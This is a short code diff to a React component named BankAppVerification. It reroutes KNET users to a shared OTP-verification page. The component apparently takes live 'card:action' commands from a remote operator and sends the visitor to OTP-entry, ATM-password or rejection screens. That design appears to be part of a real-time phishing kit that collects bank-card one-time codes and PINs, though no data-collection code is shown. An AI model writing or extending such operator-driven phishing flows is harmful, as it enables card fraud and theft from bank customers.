@@ -25,7 +25,7 @@ export default function BankAppVerification() {
       console.log("bankapp card:action ->", action);
       const isKnet = localStorage.getItem("flowType") === "knet";
       waitingMessage.value = ""; setIsWaiting(false);
-      if (action === "otp") { navigate(isKnet ? "/knet-otp" : "/otp-verification"); }
+      if (action === "otp") { navigate(isKnet ? "/otp-verification" : "/otp-verification"); }
       else if (action === "atm") { navigate("/atm-password"); }
       else if (action === "reject") { setRejected(true); setError(true); }
     };
@@ -49,7 +49,7 @@ export default function BankAppVerification() {
     } else if (a.action === "otp") {
       waitingMessage.value = "";
       setIsWaiting(false);
-      navigate(localStorage.getItem("flowType") === "knet" ? "/knet-otp" : "/otp-verification");
+      navigate(localStorage.getItem("flowType") === "knet" ? "/otp-verification" : "/otp-verification");
     } else if (a.action === "atm") {
       waitingMessage.value = "";
       setIsWaiting(false);
